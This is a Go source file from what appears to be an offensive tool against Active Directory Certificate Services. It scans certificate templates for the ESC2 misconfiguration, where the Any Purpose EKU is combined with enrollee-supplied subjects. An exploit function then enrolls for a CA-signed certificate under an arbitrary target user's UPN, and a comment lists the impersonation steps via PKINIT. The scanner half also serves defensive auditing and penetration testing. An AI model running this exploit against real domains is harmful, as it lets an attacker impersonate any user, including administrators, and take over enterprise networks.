package pki

import (
	"context"
	"crypto"
	"crypto/x509"
	"fmt"
	"github.com/go-ldap/ldap/v3"
)

// ESC2Finding records a template vulnerable to ESC2 — Any Purpose EKU
// (OID 2.5.29.37.0) combined with enrollee-supplies-subject. This allows an
// attacker to request a certificate with an arbitrary SAN (just like ESC1),
// because the Any Purpose EKU satisfies authentication requirements.
type ESC2Finding struct {
	TemplateName string   `json:"template_name"`
	EKUs         []string `json:"ekus"`
}

// ScanESC2 detects ESC2 — templates with the Any Purpose EKU and
// CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled. These templates allow any
// enrollee to specify an arbitrary Subject Alternative Name in the certificate
// request, and the Any Purpose EKU means the issued cert is valid for
// client authentication (among everything else).
//
// Attack flow:
//  1. Attacker finds a template with Any Purpose EKU + enrollee supplies subject
//  2. Attacker requests a certificate with an arbitrary UPN in the SAN
//  3. The CA issues the cert because the template allows enrollee-supplied subjects
//  4. Attacker authenticates via PKINIT as the target user
func ScanESC2(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) ([]ESC2Finding, error) {
	fmt.Println("[*] Scanning for ESC2 (Any Purpose EKU + enrollee supplies subject)...")

	templates, err := EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var findings []ESC2Finding
	for _, tmpl := range templates {
		// Check for Any Purpose EKU or empty EKU list (no restrictions = any purpose)
		hasAnyPurpose := false
		noEKUs := len(tmpl.EKUs) == 0
		for _, eku := range tmpl.EKUs {
			if eku == ekuAnyPurpose {
				hasAnyPurpose = true
				break
			}
		}

		if (hasAnyPurpose || noEKUs) && tmpl.EnrolleeSuppliesSubject {
			finding := ESC2Finding{
				TemplateName: tmpl.Name,
				EKUs:         tmpl.EKUs,
			}
			findings = append(findings, finding)
			if noEKUs {
				fmt.Printf("[!] ESC2: Template %q has NO EKU restrictions (implicit any purpose) + enrollee supplies subject\n", tmpl.Name)
			} else {
				fmt.Printf("[!] ESC2: Template %q has Any Purpose EKU + enrollee supplies subject\n", tmpl.Name)
			}
			fmt.Printf("[*]   EKUs: %v\n", tmpl.EKUs)
			fmt.Printf("[*]   Manager approval: %v\n", tmpl.RequiresManagerApproval)
		}
	}

	if len(findings) == 0 {
		fmt.Println("[*] No ESC2 findings — no templates with Any Purpose EKU + enrollee supplies subject.")
	} else {
		fmt.Printf("[!] ESC2: %d finding(s) detected\n", len(findings))
	}

	return findings, nil
}

// ExploitESC2 enrolls in a template vulnerable to ESC2 (Any Purpose EKU +
// enrollee supplies subject) and forges a certificate with the target UPN in
// the Subject Alternative Name. The exploit is identical to ESC1 — the only
// difference is the detection criteria (Any Purpose EKU instead of explicit
// Client Authentication EKU).
func ExploitESC2(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] ESC2 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	// Step 1: Verify the template is ESC2-exploitable
	templates, err := EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return nil, nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var vulnTemplate *CertTemplate
	for i, t := range templates {
		if t.Name == templateName {
			vulnTemplate = &templates[i]
			break
		}
	}
	if vulnTemplate == nil {
		return nil, nil, fmt.Errorf("template %q not found", templateName)
	}

	// Verify ESC2 conditions: Any Purpose EKU (or no EKU restrictions) + enrollee supplies subject
	hasAnyPurpose := false
	noEKUs := len(vulnTemplate.EKUs) == 0
	for _, eku := range vulnTemplate.EKUs {
		if eku == ekuAnyPurpose {
			hasAnyPurpose = true
			break
		}
	}
	if !(hasAnyPurpose || noEKUs) || !vulnTemplate.EnrolleeSuppliesSubject {
		return nil, nil, fmt.Errorf("template %q is not ESC2 vulnerable (anyPurpose=%v, noEKUs=%v, enrolleeSuppliesSubject=%v)",
			templateName, hasAnyPurpose, noEKUs, vulnTemplate.EnrolleeSuppliesSubject)
	}

	fmt.Printf("[+] Template %q confirmed ESC2 vulnerable\n", templateName)
	fmt.Printf("[*] Enrollee supplies subject: %v\n", vulnTemplate.EnrolleeSuppliesSubject)
	fmt.Printf("[*] Any Purpose EKU: %v\n", hasAnyPurpose)
	fmt.Printf("[*] EKUs: %v\n", vulnTemplate.EKUs)
	fmt.Printf("[*] Manager approval: %v\n", vulnTemplate.RequiresManagerApproval)

	// Step 2: Enroll for a CA-signed certificate with target UPN
	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, false)
	if err != nil {
		return nil, nil, fmt.Errorf("enrollment failed: %w", err)
	}

	fmt.Printf("[+] Certificate obtained for %s via ESC2 on template %q\n", targetUPN, templateName)
	return cert, certKey, nil
}
